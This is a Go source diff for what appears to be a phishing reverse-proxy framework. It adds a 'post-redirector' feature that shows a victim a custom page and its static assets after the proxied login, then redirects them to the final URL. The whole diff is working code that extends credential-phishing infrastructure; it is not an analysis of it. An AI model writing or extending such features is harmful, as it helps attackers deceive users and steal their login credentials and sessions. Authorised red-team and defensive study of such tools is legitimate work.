@@ -804,6 +804,49 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							} else {
 								//log.Warning("lure: template file does not exist: %s", path)
 							}
+						} else if s.PostRedirectorName != "" {
+							// session has a post-redirector active - serve its static assets
+
+							post_rel_parts := []string{}
+							post_req_parts := strings.Split(req_path, "/")
+							post_lure_parts := strings.Split(s.PostLureDirPath, "/")
+
+							for n, dname := range post_req_parts {
+								if len(dname) > 0 {
+									path_add := true
+									if n < len(post_lure_parts) {
+										if post_req_parts[n] == post_lure_parts[n] {
+											path_add = false
+										}
+									}
+									if path_add {
+										post_rel_parts = append(post_rel_parts, post_req_parts[n])
+									}
+								}
+							}
+							post_rel_path := filepath.Join(post_rel_parts...)
+
+							post_t_dir := s.PostRedirectorName
+							if !filepath.IsAbs(post_t_dir) {
+								post_t_dir = filepath.Join(p.cfg.GetPostRedirectorsDir(), post_t_dir)
+							}
+
+							post_path := filepath.Join(post_t_dir, post_rel_path)
+							if info, err := os.Stat(post_path); !os.IsNotExist(err) && !info.IsDir() {
+								fdata, err := ioutil.ReadFile(post_path)
+								if err == nil {
+									mime_type := getContentType(req_path, fdata)
+									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
+									if resp != nil {
+										resp.Body = io.NopCloser(bytes.NewReader(fdata))
+										return req, resp
+									} else {
+										log.Error("post-redirector: failed to create asset response")
+									}
+								} else {
+									log.Error("post-redirector: failed to read asset file: %s", err)
+								}
+							}
 						}
 					}
 				}
@@ -1582,8 +1625,47 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Contains(string(body), "</head>") || strings.Contains(string(body), "</body>")) {
 							// redirect only if received response content is of `text/html` content type
 							s.RedirectCount += 1
-							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
 
+							// serve post-redirector page if configured and not yet served
+							if s.PhishLure != nil && s.PhishLure.PostRedirector != "" && !s.PostRedirectorServed {
+								s.PostRedirectorServed = true
+								s.PostRedirectorName = s.PhishLure.PostRedirector
+								s.PostLureDirPath = resp.Request.URL.Path
+
+								t_dir := s.PhishLure.PostRedirector
+								if !filepath.IsAbs(t_dir) {
+									t_dir = filepath.Join(p.cfg.GetPostRedirectorsDir(), t_dir)
+								}
+
+								index_path1 := filepath.Join(t_dir, "index.html")
+								index_path2 := filepath.Join(t_dir, "index.htm")
+								index_found := ""
+								if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
+									index_found = index_path1
+								} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
+									index_found = index_path2
+								}
+
+								if index_found != "" {
+									if html, err := ioutil.ReadFile(index_found); err == nil {
+										post_body := string(html)
+										// replace {lure_url_html} and {redirect_url} with the final redirect URL
+										post_body = strings.ReplaceAll(post_body, "{lure_url_html}", s.RedirectURL)
+										post_body = strings.ReplaceAll(post_body, "{redirect_url}", s.RedirectURL)
+										log.Important("[%d] serving post-redirector '%s' then redirecting to: %s", ps.Index, s.PhishLure.PostRedirector, s.RedirectURL)
+										post_resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusOK, post_body)
+										if post_resp != nil {
+											return post_resp
+										}
+									} else {
+										log.Error("post-redirector: failed to read index file: %s", err)
+									}
+								} else {
+									log.Error("post-redirector: index file not found in: %s", t_dir)
+								}
+							}
+
+							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
 							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
 							return resp
 						}
